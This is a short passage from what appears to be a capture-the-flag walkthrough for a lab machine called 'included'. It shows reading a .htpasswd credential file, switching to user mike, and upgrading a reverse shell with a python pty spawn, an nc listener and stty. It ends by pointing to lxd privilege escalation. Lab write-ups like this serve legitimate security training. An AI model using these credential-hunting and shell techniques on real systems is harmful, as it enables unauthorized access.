www-data --> mike
```
www-data@included:/var/www/html$ grep -rin passw
.htaccess:6:#AuthUserFile /var/www/html/.htpasswd
www-data@included:/var/www/html$ cat /var/www/html/.htpasswd
mike:<REDACTED FOR WALKTHROUGH>

www-data@included:/var/www/html$ su - mike
Password: 
mike@included:~$ whoami
mike
mike@included:~$ id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
mike@included:~$ sudo -l
[sudo] password for mike: 
Sorry, user mike may not run sudo on included.
```
# Upgrading the shell
```
mike@included:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
mike@included:/dev/shm$ ^Z
zsh: suspended  nc -lvnp 1337                                                                       
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337
                               stty size;export TERM=xterm-256color

```
Time to look at lxd.
